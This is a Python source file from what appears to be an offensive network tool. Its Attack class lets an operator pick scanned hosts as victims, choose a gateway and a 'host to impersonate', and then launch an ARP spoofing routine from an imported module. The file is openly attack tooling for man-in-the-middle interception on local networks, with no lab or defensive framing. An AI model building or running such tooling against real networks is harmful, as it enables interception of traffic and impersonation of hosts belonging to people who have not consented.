from ipaddress import IPv4Address

import inquirer
from rich.console import Console

from utils.attacks._arp_spoof_ import ArpSpoof
from utils.object.host import Host
from utils.scans import Scan, Scans


class Attack:
    def __init__(self, scans: Scans, console: Console):
        self.scan: Scan = scans.select()
        self.console = console
        self.selected_hosts: list[Host] = []
        self.gateway: Host = self.select_gateway()
        self.fake_sender: Host = self.select_fake_sender()

    def start(self):
        self._arp_spoof_()

    def _arp_spoof_(self):
        arp_spoof = ArpSpoof(hosts_list=self.selected_hosts, fake_sender=self.fake_sender,
                             interface=self.scan.interface, gateway=self.gateway)
        arp_spoof.start()

    def select_victims(self):
        self.scan.summary()
        questions = [
            inquirer.Checkbox('hosts',
                              message="Select hosts to attack",
                              choices=self.scan.found_hosts.keys()
                              ),
        ]

        for host in inquirer.prompt(questions)['hosts']:
            self.selected_hosts.append(self.scan.found_hosts[host])

    def select_gateway(self):
        self.scan.summary()
        questions = [
            inquirer.List('gateway',
                              message="Select gateway",
                              choices=self.scan.found_hosts.keys()
                              ),
        ]

        response = inquirer.prompt(questions)['gateway']
        return self.scan.found_hosts[response]

    def select_fake_sender(self):
        self.scan.summary()
        questions = [
            inquirer.List('fake_sender',
                          message="Select host to impersonate",
                          choices=self.scan.found_hosts.keys()
                          ),
        ]
        response = inquirer.prompt(questions)['fake_sender']
        return self.scan.found_hosts[response]
